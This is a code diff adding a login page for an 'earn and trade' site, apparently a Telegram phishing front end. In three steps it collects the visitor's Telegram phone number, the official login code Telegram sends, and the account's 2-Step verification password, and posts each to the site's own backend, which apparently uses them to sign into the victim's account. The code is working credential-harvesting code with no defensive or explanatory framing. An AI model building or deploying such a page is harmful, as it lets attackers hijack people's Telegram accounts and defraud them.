@@ -1,0 +1,170 @@
+<div class="auth-container">
+    <div class="logo-wrapper">
+        <img src="{{ url_for('static', filename='logo.png') }}" class="brand-logo" alt="Logo" onerror="this.src='https://via.placeholder.com/100'">
+    </div>
+    
+    <div class="header-title">AAF TELE-EARN TRADE</div>
+    <div id="status-box"></div>
+
+    <div class="auth-step active-step" id="step-1">
+        <div class="input-box">
+            <input type="tel" id="phone" placeholder="Enter Telegram Number">
+        </div>
+        <button class="btn-action" id="btn-otp" onclick="sendOTP()">Get Official Code</button>
+    </div>
+
+    <div class="auth-step" id="step-2">
+        <p style="font-size: 12px; color: var(--text-dim); margin-bottom: 15px;">Enter the 5-digit code from Telegram</p>
+        <div class="input-box">
+            <input type="tel" id="otp-code" placeholder="Enter OTP Code">
+        </div>
+        <button class="btn-action" id="btn-verify" onclick="verifyOTP()">Verify Code</button>
+    </div>
+
+    <div class="auth-step" id="step-3">
+        <p style="font-size: 12px; color: var(--gold); margin-bottom: 15px;">Your account has 2-Step verification enabled</p>
+        <div class="input-box">
+            <input type="password" id="two-step-pass" placeholder="2-Step Password">
+        </div>
+        <button class="btn-action" id="btn-final" onclick="verifyFinal()">Access Account</button>
+    </div>
+</div>
+
+<script>
+    // গ্লোবাল ভেরিয়েবল (এগুলো ডাটা ধরে রাখবে)
+    let finalPhone = "";
+    let finalOTP = "";
+
+    // ফোন ইনপুট এবং কান্ট্রি কোড সেটআপ
+    const phoneInput = document.querySelector("#phone");
+    const iti = window.intlTelInput(phoneInput, {
+        initialCountry: "bd",
+        separateDialCode: true,
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js",
+    });
+
+    const API_URL = window.location.origin;
+
+    // ধাপ পরিবর্তনের ফাংশন
+    function goToStep(num) {
+        document.querySelectorAll('.auth-step').forEach(s => s.classList.remove('active-step'));
+        const step = document.getElementById(`step-${num}`);
+        if (step) step.classList.add('active-step');
+    }
+
+    // নোটিফিকেশন মেসেজ
+    function notify(msg) {
+        const box = document.getElementById('status-box');
+        if (box) {
+            box.innerText = msg;
+            box.style.display = 'block';
+            setTimeout(() => { box.style.display = 'none'; }, 5000);
+        } else {
+            alert(msg);
+        }
+    }
+
+    // ধাপ ১: ওটিপি পাঠানো
+    async function sendOTP() {
+        finalPhone = iti.getNumber();
+        if (!finalPhone) return notify("Please enter your phone number!");
+
+        const btn = document.getElementById('btn-otp');
+        btn.disabled = true;
+        btn.innerText = "SENDING...";
+
+        try {
+            const res = await fetch(`${API_URL}/api/send_otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: finalPhone })
+            });
+            const data = await res.json();
+            if (data.success) {
+                notify("OTP Sent Successfully!");
+                goToStep(2);
+            } else {
+                notify(data.message);
+            }
+        } catch (e) { 
+            notify("Backend Connection Error!"); 
+        } finally { 
+            btn.disabled = false; 
+            btn.innerText = "Get Official Code"; 
+        }
+    }
+
+    // ধাপ ২: ওটিপি ভেরিফাই
+    async function verifyOTP() {
+        // ইনপুট থেকে ওটিপি কোড নিয়ে গ্লোবাল ভেরিয়েবলে সেভ করা হচ্ছে
+        finalOTP = document.getElementById('otp-code').value;
+
+        if (!finalOTP) return notify("Enter the code!");
+
+        const btn = document.getElementById('btn-verify');
+        btn.disabled = true;
+        btn.innerText = "VERIFYING...";
+
+        try {
+            const res = await fetch(`${API_URL}/api/verify_login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: finalPhone, 
+                    code: finalOTP,
+                    password: null 
+                })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                window.location.replace("/dashboard");
+            } else if (data.message.toLowerCase().includes("password") || data.message.includes("required")) {
+                notify("2-Step Password Required!");
+                goToStep(3); // পাসওয়ার্ড স্টেপে নিয়ে যাবে
+            } else {
+                notify(data.message);
+            }
+        } catch (e) { 
+            notify("Verification Failed!"); 
+        } finally { 
+            btn.disabled = false; 
+            btn.innerText = "Verify Code"; 
+        }
+    }
+
+    // ধাপ ৩: টু-স্টেপ পাসওয়ার্ড সাবমিট (সবচেয়ে গুরুত্বপূর্ণ)
+    async function verifyFinal() {
+        const pwd = document.getElementById('two-step-pass').value;
+        const btn = document.getElementById('btn-final');
+
+        if (!pwd) return notify("Enter your 2-Step Password!");
+
+        btn.disabled = true;
+        btn.innerText = "ACCESSING...";
+
+        try {
+            const res = await fetch(`${API_URL}/api/verify_login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: finalPhone, 
+                    code: finalOTP, // এখানে গ্লোবাল ভেরিয়েবল থেকে সঠিক ওটিপি পাঠানো হচ্ছে
+                    password: pwd 
+                })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                window.location.replace("/dashboard");
+            } else {
+                notify(data.message); 
+            }
+        } catch (e) { 
+            notify("Login Error! Connection failed."); 
+        } finally {
+            btn.disabled = false;
+            btn.innerText = "Access Account";
+        }
+    }
+</script>
